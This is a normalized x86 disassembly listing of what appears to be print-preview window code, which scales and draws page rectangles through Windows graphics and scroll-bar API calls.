pop ecx
mov ecx [ esi + 0x74 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_45a1d5
push edi
call sub_441eb2
pop ecx
cmp [ esi + 0x100 ] 0x0
lea edi [ esi + 0x100 ]
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x78 ]
call sub_446c9d
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_44882e
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push 0x7f00
push 0x0
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
push [ edi ]
call [ DestroyCursor@IAT ]
sub_4586a1
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_44669b
cmp eax 0xffffffff
jne r-xdata
mov ecx [ edi ]
mov ecx [ ecx + 0xc ]
mov [ esi + 0x6c ] ecx
or eax eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4586c5
mov eax sub_463c27
call sub_42dc88
sub esp 0x1c
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push edi
push 0x3c
mov [ esi + 0x70 ] eax
call sub_441e89
pop ecx
mov [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_45a14d
jmp r-xdata
xor eax eax
mov ecx eax
call sub_45a38f
jmp r-xdata
mov [ esi + 0x114 ] eax
mov eax [ eax ]
or [ ebp - 0x4 ] 0xffffffff
push 0x1
mov [ eax + 0x3c ] 0x7009
mov eax [ esi + 0x114 ]
pop edi
mov eax [ eax ]
push 0x40
mov eax [ eax + 0x5c ]
or [ eax + 0x14 ] 0x40
mov eax [ esi + 0x114 ]
mov eax [ eax ]
mov eax [ eax + 0x5c ]
and [ eax + 0x15 ] 0xfe
mov eax [ esi + 0x114 ]
mov [ eax + 0x8 ] edi
call sub_441e89
pop ecx
mov [ ebp + 0x8 ] eax
test eax eax
mov [ ebp - 0x4 ] edi
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
mov eax [ esi + 0x114 ]
push ebx
lea ebx [ esi + 0x78 ]
mov eax [ eax ]
mov ecx ebx
mov eax [ eax + 0x5c ]
push [ eax + 0x10 ]
call sub_446c1f
mov edx [ esi + 0x114 ]
mov ecx [ esi + 0x74 ]
mov edx [ edx ]
mov eax [ ecx ]
mov edx [ edx + 0x5c ]
push [ edx + 0x10 ]
call [ eax + 0xc ]
mov eax [ esi + 0x74 ]
mov ecx ebx
mov [ eax + 0xc ] edi
mov eax [ ebx ]
mov [ esi + 0x84 ] edi
call [ eax + 0x1c ]
push [ esi + 0x1c ]
call [ GetDC@IAT ]
mov ecx [ esi + 0x74 ]
push eax
mov [ ebp + 0x8 ] eax
mov edx [ ecx ]
call [ edx + 0x10 ]
mov ecx [ esi + 0x70 ]
push [ esi + 0x114 ]
mov eax [ ecx ]
push [ esi + 0x74 ]
call [ eax + 0xf8 ]
mov ecx [ esi + 0x74 ]
mov eax [ ecx ]
call [ eax + 0x18 ]
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
call [ ReleaseDC@IAT ]
mov eax [ ebx ]
push 0xffffffff
mov ecx ebx
call [ eax + 0x20 ]
lea ebx [ esi + 0x80 ]
push 0x58
push [ ebx ]
call [ GetDeviceCaps@IAT ]
push 0x5a
mov [ esi + 0x104 ] eax
push [ ebx ]
call [ GetDeviceCaps@IAT ]
mov [ esi + 0x108 ] eax
mov eax [ esi + 0x114 ]
xor ebx ebx
mov eax [ eax + 0x18 ]
cmp eax ebx
mov [ esi + 0xf8 ] eax
jne r-xdata
mov ecx [ esi + 0x70 ]
push [ esi + 0x114 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x74 ] eax
mov eax [ ecx ]
call [ eax + 0xf4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0xf0 ]
cmp eax ecx
jbe r-xdata
mov [ esi + 0xf8 ] edi
jmp r-xdata
mov eax [ esi + 0xf8 ]
mov ecx edi
mov [ esi + 0xe8 ] eax
mov eax r--data
push eax
push eax
push edi
push ecx
push edi
mov ecx esi
call sub_4489a3
mov eax [ esi + 0x114 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x5c ]
mov dx [ ecx + 0x1e ]
cmp dx 0x8000
jae r-xdata
mov [ esi + 0xf8 ] ecx
push ebx
push edi
push [ esi + 0x1c ]
call [ ShowScrollBar@IAT ]
movzx ecx [ ecx + 0x1c ]
movzx edx dx
sub edx ecx
cmp edx 0x7fff
ja r-xdata
mov [ ebp - 0x24 ] 0x3
mov ecx [ eax ]
push ebx
mov ecx [ ecx + 0x5c ]
movzx ecx [ ecx + 0x1c ]
mov [ ebp - 0x20 ] ecx
mov eax [ eax ]
mov ecx esi
mov eax [ eax + 0x5c ]
movzx eax [ eax + 0x1e ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x28 ]
push eax
push edi
mov [ ebp - 0x18 ] edi
call sub_4400c7
test eax eax
jne r-xdata
mov eax [ esi + 0x114 ]
push edi
mov ecx esi
push [ eax + 0x14 ]
call sub_45959a
mov eax edi
pop ebx
push ebx
mov ecx esi
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push edi
call sub_440021
jmp r-xdata
sub_458908
push ebx
push esi
push edi
xor edi edi
cmp [ ecx + 0xec ] edi
jne r-xdata
mov esi [ esp + 0x14 ]
push 0xa
mov eax esi
pop ebx
cdq
idiv ebx
mov edi [ esp + 0x18 ]
mov [ ecx + 0x54 ] esi
push edi
push esi
push [ esp + 0x18 ]
mov [ ecx + 0x58 ] edi
mov [ ecx + 0x5c ] eax
mov eax edi
cdq
idiv ebx
mov [ ecx + 0x60 ] eax
call sub_448ba0
lea eax [ ecx + 0xf0 ]
xor edx edx
cmp [ eax ] edi
jbe r-xdata
call sub_43e71a
jmp r-xdata
xor esi esi
pop edi
pop esi
pop ebx
retn 0xc
mov ebx [ ecx + 0x90 ]
inc edx
mov [ esi + ebx + 0x18 ] edi
add esi 0x28
cmp edx [ eax ]
jb r-xdata
sub_45896e
cmp [ esp + 0x4 ] 0x0
push esi
mov esi ecx
je r-xdata
pop esi
retn 0xc
call [ GetFocus@IAT ]
push eax
call sub_43e7b3
test eax eax
je r-xdata
mov ecx [ esi + 0x8c ]
push 0xe304
call sub_441585
mov ecx eax
call sub_441868
mov ecx [ esi + 0x8c ]
test ecx ecx
je r-xdata
push [ eax + 0x1c ]
push [ ecx + 0x1c ]
call [ IsChild@IAT ]
test eax eax
jne r-xdata
sub_4589bd
push esi
mov esi ecx
mov ecx [ esi + 0x8c ]
push edi
lea edi [ esi + 0x8c ]
mov eax [ ecx ]
call [ eax + 0x58 ]
mov eax [ esi + 0x114 ]
mov ecx [ esi + 0xf4 ]
xor edx edx
push esi
mov [ edi ] edx
mov [ eax + 0x14 ] ecx
mov ecx [ esi + 0x6c ]
xor eax eax
push edx
push eax
push [ esi + 0x114 ]
mov edi [ ecx ]
push [ esi + 0x74 ]
call [ edi + 0x104 ]
pop edi
pop esi
retn
sub_458a01
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x18 ]
push edi
push esi
push [ ebp + 0x14 ]
call [ MulDiv@IAT ]
cmp eax [ ebp + 0xc ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] edi
pop edi
pop esi
pop ebp
retn 0x14
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x14 ]
sub_458a30
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
lea eax [ ebp - 0x8 ]
push edi
mov esi ecx
push eax
call sub_458adc
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x90 ]
mov eax [ esi + 0x78 ]
lea ecx [ esi + 0x78 ]
lea edi [ edi + edi * 4 ]
shl edi 0x3
lea edx [ edi + edx + 0x10 ]
push edx
push 0x0
push 0x0
push 0xc
call [ eax + 0x70 ]
mov eax [ esi + 0x90 ]
push [ esi + 0x104 ]
push [ rw-data ]
lea ebx [ edi + eax + 0x10 ]
push [ ebx ]
call [ MulDiv@IAT ]
mov [ ebx ] eax
push [ esi + 0x108 ]
push [ rw-data ]
push [ ebx + 0x4 ]
call [ MulDiv@IAT ]
mov [ ebx + 0x4 ] eax
push [ ebx + 0x4 ]
mov eax [ esi ]
lea ecx [ ebp - 0x10 ]
push [ ebx ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push ecx
mov ecx esi
call [ eax + 0x108 ]
mov ecx [ esi + 0x90 ]
mov edx [ eax ]
push [ ebp + 0x8 ]
mov [ edi + ecx + 0x20 ] edx
mov eax [ eax + 0x4 ]
mov [ edi + ecx + 0x24 ] eax
mov ecx esi
call sub_458b60
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_458adc
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0x10 ]
push esi
push eax
lea eax [ ebp - 0x8 ]
mov esi ecx
push eax
call sub_448cbe
cmp [ esi + 0xec ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ esi + 0x114 ]
mov eax [ eax ]
mov eax [ eax + 0x5c ]
mov cx [ eax + 0x1e ]
cmp cx 0xffff
je r-xdata
sub ecx 0x10
lea eax [ ecx - 0x18 ]
cdq
sub eax edx
sar eax 0x1
mov ecx eax
jmp r-xdata
movzx eax [ eax + 0x1c ]
movzx ecx cx
sub ecx eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
sub edx 0x10
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
leave
retn 0x4
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x10 ]
jmp r-xdata
lea eax [ ecx - 0x8 ]
cdq
sub eax edx
sar eax 0x1
cmp [ esi + 0xf8 ] 0x2
mov [ esi + 0xfc ] eax
pop esi
jne r-xdata
sub_458b60
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
lea edi [ edi + edi * 4 ]
mov eax [ ebx + 0x90 ]
shl edi 0x3
lea esi [ edi + eax ]
lea eax [ ebp - 0x8 ]
push eax
call sub_458adc
mov ecx [ esi + 0x24 ]
mov eax [ ebx + 0xec ]
xor edx edx
cmp [ esi + 0x20 ] ecx
setl dl
sub eax 0x0
je r-xdata
mov eax [ esi + 0x20 ]
mov [ esi + 0x18 ] eax
mov eax [ esi + 0x24 ]
mov [ esi + 0x1c ] eax
dec eax
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
sub ecx [ esi + 0x4 ]
sub eax [ esi ]
lea edx [ ebp - 0x8 ]
push r--data
add ecx 0x10
add eax 0x10
push edx
push ecx
push eax
push 0x1
mov ecx ebx
call sub_4489a3
mov ecx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
sub ecx [ esi + 0x4 ]
mov edi [ esi + 0x8 ]
sub edi [ esi ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
dec eax
push eax
mov eax [ ebp - 0x8 ]
sub eax edi
mov edi [ OffsetRect@IAT ]
cdq
sub eax edx
sar eax 0x1
dec eax
push eax
push esi
call edi
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
test edx edx
mov [ esi + 0x1c ] ecx
mov eax [ esi + 0x20 ]
je r-xdata
dec eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
push 0x0
push [ ebx + 0xfc ]
push esi
call edi
jmp r-xdata
lea eax [ eax + eax * 2 ]
sub eax ecx
jmp r-xdata
add eax ecx
push [ esi + 0x1c ]
push [ esi + 0x18 ]
push [ esi + 0x10 ]
call [ MulDiv@IAT ]
push [ esi + 0x1c ]
mov [ ebp - 0x10 ] eax
push [ esi + 0x18 ]
push [ esi + 0x14 ]
call [ MulDiv@IAT ]
add edi [ ebx + 0x90 ]
add eax 0xb
push eax
mov eax [ ebp - 0x10 ]
add eax 0xb
mov esi edi
push eax
push 0x8
push 0x8
push esi
call [ SetRect@IAT ]
cmp [ ebx + 0xec ] 0x0
jne r-xdata
test edx edx
je r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ esi + 0x1c ] ecx
mov eax [ esi + 0x20 ]
shl eax 0x1
sub eax [ esi + 0x24 ]
jmp r-xdata
push 0x1
pop eax
mov [ esi + 0x1c ] eax
jmp r-xdata
mov [ esi + 0x18 ] eax
jmp r-xdata
sub_458c97
cmp [ ecx + 0xec ] 0x0
jne r-xdata
mov eax [ ecx + 0x90 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_446a9a
jmp r-xdata
retn 0x8
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_448839
sub_458ccb
mov eax sub_463c44
call sub_42dc88
sub esp 0x18
push esi
push edi
push 0xc
call [ GetSysColor@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call sub_4477ce
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x14 ]
mov ecx esi
push eax
call sub_446db3
lea ecx [ ebp - 0x24 ]
mov edi eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x1c ]
sub eax [ ebp - 0x20 ]
sub ecx [ ebp - 0x24 ]
push 0xf00021
push eax
push ecx
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
push [ esi + 0x4 ]
call [ PatBlt@IAT ]
push edi
mov ecx esi
call sub_446db3
mov [ ebp - 0x14 ] r--data
push 0x1
lea ecx [ ebp - 0x14 ]
pop esi
mov [ ebp - 0x4 ] esi
call sub_4477b8
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_458d5b
mov eax sub_463c70
call sub_42dc88
sub esp 0x68
push ebx
push esi
mov ebx ecx
xor esi esi
cmp [ ebx + 0x70 ] esi
je r-xdata
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebx + 0x7c ] esi
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x24 ]
push eax
push [ edi + 0x8 ]
call [ GetViewportOrgEx@IAT ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x3c ] r--data
mov [ ebp - 0x4 ] esi
mov esi [ GetSysColor@IAT ]
push 0x6
call esi
push eax
push 0x2
push 0x0
call [ CreatePen@IAT ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_447761
and [ ebp - 0x30 ] 0x0
mov [ ebp - 0x34 ] r--data
push 0x10
mov [ ebp - 0x4 ] 0x1
call esi
push eax
xor esi esi
push 0x3
push esi
call [ CreatePen@IAT ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_447761
mov eax [ ebx + 0x114 ]
mov [ ebp - 0x10 ] esi
mov [ eax + 0x10 ] 0x1
cmp [ ebx + 0xf8 ] esi
jbe r-xdata
lea ecx [ ebp - 0x3c ]
call sub_4477b8
lea ecx [ ebp - 0x34 ]
call sub_4477b8
mov esi r--data
mov [ ebp - 0x34 ] esi
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x2
call sub_4477b8
mov [ ebp - 0x3c ] esi
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x4 ] 0x3
call sub_4477b8
pop edi
mov [ ebp - 0x14 ] esi
jmp r-xdata
mov eax [ ebx + 0x78 ]
lea ecx [ ebx + 0x78 ]
call [ eax + 0x1c ]
test edi edi
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ edi + 0x4 ]
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x74 ]
mov esi [ GetDeviceCaps@IAT ]
push 0xa
push [ eax + 0x8 ]
call esi
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x74 ]
push 0x8
push [ eax + 0x8 ]
call esi
push [ ebp - 0x1c ]
mov ecx [ ebx + 0x114 ]
add ecx 0x24
push eax
push 0x0
push 0x0
push ecx
call [ SetRect@IAT ]
mov eax [ ebx + 0x114 ]
mov ecx [ ebx + 0x74 ]
add eax 0x24
push 0x2
push eax
push [ ecx + 0x8 ]
call [ DPtoLP@IAT ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x1c ]
mov eax [ ebx + 0x90 ]
mov ecx [ ebp - 0x14 ]
cmp [ ecx + eax + 0x18 ] 0x0
lea esi [ ecx + eax ]
mov [ ebp - 0x1c ] esi
jne r-xdata
mov ecx [ ebx + 0x70 ]
push eax
push [ ebx + 0x74 ]
mov edx [ ecx ]
call [ edx + 0xdc ]
mov ecx [ ebx + 0x74 ]
push eax
mov edx [ ecx ]
call [ edx + 0x10 ]
mov eax [ ebx + 0xf4 ]
mov ecx [ ebx + 0x114 ]
add eax [ ebp - 0x10 ]
mov [ ecx + 0x14 ] eax
mov eax [ ebx + 0x114 ]
mov edx [ ebx + 0xf4 ]
mov ecx [ eax ]
add edx [ ebp - 0x10 ]
mov ecx [ ecx + 0x5c ]
movzx ecx [ ecx + 0x1e ]
cmp edx ecx
ja r-xdata
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax + 0x34 ]
push [ ebp - 0x28 ]
mov eax [ edi ]
lea ecx [ ebp - 0x4c ]
push [ ebp - 0x2c ]
push ecx
mov ecx edi
call [ eax + 0x38 ]
push 0x0
lea eax [ ebp - 0x54 ]
push 0x0
push eax
mov ecx edi
call sub_447079
mov eax [ edi ]
push 0x5
mov ecx edi
call [ eax + 0x24 ]
lea eax [ ebp - 0x3c ]
mov ecx edi
push eax
call sub_446db3
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
push [ edi + 0x4 ]
call [ Rectangle@IAT ]
lea eax [ ebp - 0x34 ]
mov ecx edi
push eax
call sub_446db3
mov eax [ esi + 0x4 ]
mov ecx edi
add eax 0x3
push eax
mov eax [ esi + 0x8 ]
inc eax
push eax
lea eax [ ebp - 0x5c ]
push eax
call sub_44723d
mov eax [ esi + 0xc ]
mov ecx edi
inc eax
push eax
mov eax [ esi + 0x8 ]
inc eax
push eax
call sub_447289
mov eax [ esi + 0xc ]
mov ecx edi
inc eax
push eax
mov eax [ esi ]
add eax 0x3
push eax
lea eax [ ebp - 0x64 ]
push eax
call sub_44723d
mov eax [ esi + 0xc ]
mov ecx edi
inc eax
push eax
mov eax [ esi + 0x8 ]
inc eax
push eax
call sub_447289
lea edi [ ebp - 0x74 ]
push 0x0
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
inc [ ebp - 0x74 ]
inc [ ebp - 0x70 ]
sub [ ebp - 0x6c ] 0x2
sub [ ebp - 0x68 ] 0x2
call [ GetStockObject@IAT ]
mov esi [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x74 ]
push eax
push [ esi + 0x4 ]
call [ FillRect@IAT ]
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0x20 ]
mov eax [ ebx + 0x114 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov eax [ ebx ]
push [ ebp - 0x10 ]
mov ecx ebx
call [ eax + 0x10c ]
cmp [ ebx + 0xec ] 0x0
je r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ eax ]
mov ecx [ ebx + 0xf4 ]
mov edi [ ebp - 0x10 ]
mov eax [ eax + 0x5c ]
lea edx [ ecx + edi ]
movzx eax [ eax + 0x1e ]
cmp edx eax
ja r-xdata
lea eax [ ebp - 0x44 ]
mov ecx ebx
push eax
call sub_448ad5
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
neg ecx
neg eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] ecx
mov eax [ ebx + 0xf4 ]
cmp eax 0x1
jbe r-xdata
mov ecx [ ebx + 0x74 ]
mov eax [ ecx ]
call [ eax + 0x18 ]
mov eax [ ebx + 0x78 ]
push [ ebp - 0x18 ]
lea ecx [ ebx + 0x78 ]
call [ eax + 0x20 ]
test edi edi
jne r-xdata
mov eax [ ebx ]
inc edi
push edi
push ecx
mov ecx ebx
call [ eax + 0x110 ]
mov esi [ ebp - 0x1c ]
mov ecx [ ebx + 0x74 ]
push [ esi + 0x1c ]
push [ esi + 0x18 ]
call sub_45a4a1
mov ecx [ ebx + 0x74 ]
lea edx [ ebp - 0x24 ]
push edx
push 0x0
mov eax [ ecx ]
push 0x0
push 0xd
call [ eax + 0x70 ]
mov ecx [ ebx + 0x74 ]
lea eax [ ebp - 0x24 ]
push eax
call sub_45b211
mov eax [ esi ]
mov esi [ esi + 0x4 ]
add [ ebp - 0x24 ] eax
add [ ebp - 0x20 ] esi
mov eax [ ebp - 0x2c ]
inc [ ebp - 0x24 ]
add [ ebp - 0x24 ] eax
mov eax [ ebp - 0x28 ]
inc [ ebp - 0x20 ]
add [ ebp - 0x20 ] eax
push [ ebp - 0x20 ]
mov ecx [ ebx + 0x74 ]
push [ ebp - 0x24 ]
call sub_45b179
mov ecx [ ebx + 0x74 ]
call sub_45b18f
mov ecx [ ebx + 0x70 ]
push [ ebx + 0x114 ]
mov eax [ ecx ]
push [ ebx + 0x74 ]
call [ eax + 0xfc ]
mov ecx [ ebx + 0x74 ]
mov eax [ ecx ]
call [ eax + 0x18 ]
mov eax [ ebx + 0x78 ]
push [ ebp - 0x18 ]
lea ecx [ ebx + 0x78 ]
call [ eax + 0x20 ]
add [ ebp - 0x14 ] 0x28
cmp edi [ ebx + 0xf8 ]
mov [ ebp - 0x10 ] edi
jb r-xdata
dec eax
push 0x1
push eax
mov ecx ebx
call sub_45959a
mov edi [ ebp + 0x8 ]
jmp r-xdata
sub_45915b
push ebp
mov ebp esp
cmp [ ecx + 0xec ] 0x0
push esi
je r-xdata
mov eax [ ebp + 0x8 ]
sub eax 0x0
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_449038
jmp r-xdata
mov eax [ ecx + 0xf4 ]
push 0x1
dec eax
dec eax
je r-xdata
pop esi
pop ebp
retn 0xc
mov eax [ ecx + 0xf4 ]
push 0x1
inc eax
jmp r-xdata
dec eax
je r-xdata
push eax
mov eax [ ecx + 0x114 ]
push 0x1
push 0xa
mov eax [ eax ]
pop esi
mov edx [ eax + 0x5c ]
movzx eax [ edx + 0x1e ]
movzx edx [ edx + 0x1c ]
sub eax edx
xor edx edx
add eax 0x9
div esi
mov edx [ ecx + 0xf4 ]
sub edx eax
push edx
jmp r-xdata
dec eax
je r-xdata
call sub_45959a
mov eax [ ecx + 0x114 ]
push 0x1
push 0xa
mov eax [ eax ]
pop esi
mov edx [ eax + 0x5c ]
movzx eax [ edx + 0x1e ]
movzx edx [ edx + 0x1c ]
sub eax edx
xor edx edx
add eax 0x9
div esi
add eax [ ecx + 0xf4 ]
jmp r-xdata
dec eax
je r-xdata
push 0x1
push [ ebp + 0xc ]
jmp r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ecx + 0x114 ]
push 0x1
mov eax [ eax ]
mov eax [ eax + 0x5c ]
movzx eax [ eax + 0x1c ]
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ecx + 0x114 ]
push 0x1
mov eax [ eax ]
mov eax [ eax + 0x5c ]
movzx eax [ eax + 0x1e ]
jmp r-xdata
sub_459246
push esi
push edi
mov edi ecx
push 0x3
pop eax
sub eax [ edi + 0xf8 ]
lea esi [ edi + 0xf8 ]
mov [ esi ] eax
call sub_45357b
mov eax [ eax + 0x4 ]
mov ecx [ esi ]
push 0x1
mov [ eax + 0xb4 ] ecx
mov eax [ esi ]
push [ edi + 0xf4 ]
mov ecx edi
mov [ edi + 0xe8 ] eax
call sub_45959a
pop edi
pop esi
retn
sub_4592c8
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0xec ] 0x0
push edi
je r-xdata
mov edi [ ebp + 0xc ]
and [ edi ] 0x0
cmp [ ebx + 0xf8 ] 0x0
jbe r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_448ad5
mov ecx eax
mov eax [ ecx ]
mov ecx [ ecx + 0x4 ]
add [ esi ] eax
add [ esi + 0x4 ] ecx
xor eax eax
mov eax [ edi ]
push [ esi + 0x4 ]
mov ecx [ ebx + 0x90 ]
push [ esi ]
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 8 ]
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov eax [ edi ]
mov edx [ ebx + 0x90 ]
lea ecx [ eax + eax * 4 ]
mov eax [ edx + ecx * 8 ]
mov ecx [ edx + ecx * 8 + 0x4 ]
sub [ esi ] eax
sub [ esi + 0x4 ] ecx
mov eax [ edi ]
mov ecx [ ebx + 0x90 ]
mov edx [ esi ]
lea eax [ eax + eax * 4 ]
push [ ecx + eax * 8 + 0x18 ]
lea eax [ ecx + eax * 8 ]
push [ eax + 0x1c ]
push edx
call [ MulDiv@IAT ]
mov [ esi ] eax
mov edi [ edi ]
mov ecx [ ebx + 0x90 ]
lea eax [ edi + edi * 4 ]
push [ ecx + eax * 8 + 0x18 ]
lea eax [ ecx + eax * 8 ]
push [ eax + 0x1c ]
push [ esi + 0x4 ]
call [ MulDiv@IAT ]
push 0x1
mov [ esi + 0x4 ] eax
pop eax
jmp r-xdata
inc [ edi ]
mov eax [ edi ]
cmp eax [ ebx + 0xf8 ]
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_459392
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push esi
push eax
lea eax [ ebp + 0xc ]
mov esi ecx
push eax
call sub_4592c8
test eax eax
je r-xdata
pop esi
leave
retn 0xc
mov eax [ esi + 0xec ]
cmp eax 0x2
jne r-xdata
inc eax
xor eax eax
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push eax
call sub_4593d0
sub_4593f4
mov eax [ ecx + 0xec ]
cmp eax 0x2
je r-xdata
retn
push esi
xor esi esi
xor edx edx
push esi
push edx
inc eax
push esi
push eax
call sub_4593d0
pop esi
sub_459410
mov eax [ ecx + 0xec ]
push esi
xor esi esi
cmp eax esi
je r-xdata
pop esi
retn
xor edx edx
push esi
push edx
dec eax
push esi
push eax
call sub_4593d0
sub_45942b
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
cmp [ esi + 0xec ] ebx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x90 ]
mov [ esi + 0xf8 ] 0x1
push ebx
lea edi [ ecx + ecx * 4 ]
shl edi 0x3
mov edx [ eax + edi + 0x20 ]
mov [ eax + 0x20 ] edx
mov edx [ eax + edi + 0x24 ]
mov [ eax + 0x24 ] edx
mov eax [ esi + 0x90 ]
mov edx [ eax + edi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ eax + edi + 0x14 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0xf4 ]
add eax ecx
mov ecx esi
push eax
call sub_45959a
push ebx
mov ecx esi
call sub_458b60
mov eax [ esi + 0x90 ]
mov ebx [ MulDiv@IAT ]
push [ edi + eax + 0x1c ]
lea edi [ edi + eax + 0x18 ]
push [ edi ]
push [ ebp + 0xc ]
call ebx
push [ edi + 0x4 ]
mov [ ebp + 0xc ] eax
push [ edi ]
push [ ebp + 0x10 ]
call ebx
mov edx [ esi + 0x90 ]
mov ecx [ edx ]
add [ ebp + 0xc ] ecx
mov ecx esi
mov edx [ edx + 0x4 ]
add eax edx
push eax
push [ ebp + 0xc ]
call sub_448bc8
mov eax [ esi + 0xe8 ]
mov edi [ ShowScrollBar@IAT ]
push ebx
push ebx
push [ esi + 0x1c ]
mov [ esi + 0xf8 ] eax
call edi
mov eax [ esi + 0x114 ]
mov eax [ eax ]
mov eax [ eax + 0x5c ]
mov cx [ eax + 0x1e ]
cmp cx 0x8000
jae r-xdata
mov [ ebp + 0x8 ] ebx
movzx eax [ eax + 0x1c ]
movzx ecx cx
sub ecx eax
mov [ ebp + 0x8 ] 0x1
cmp ecx 0x7fff
jbe r-xdata
push 0x1
mov ecx esi
push [ esi + 0xf4 ]
call sub_45959a
jmp r-xdata
mov eax [ esi + 0x114 ]
mov [ ebp - 0x18 ] 0x3
push 0x1
mov ecx [ eax ]
pop edi
push ebx
mov ecx [ ecx + 0x5c ]
movzx ecx [ ecx + 0x1c ]
mov [ ebp - 0x14 ] ecx
mov eax [ eax ]
mov ecx esi
mov eax [ eax + 0x5c ]
movzx eax [ eax + 0x1e ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
push edi
mov [ ebp - 0xc ] edi
call sub_4400c7
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
push 0x1
push [ esi + 0x1c ]
call edi
cmp [ ebp + 0x8 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
push ebx
mov ecx esi
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push edi
call sub_440021
sub_45959a
mov edx [ esp + 0x4 ]
push esi
mov esi ecx
push edi
mov eax [ esi + 0x114 ]
mov [ esi + 0xf4 ] edx
mov ecx [ eax ]
mov ecx [ ecx + 0x5c ]
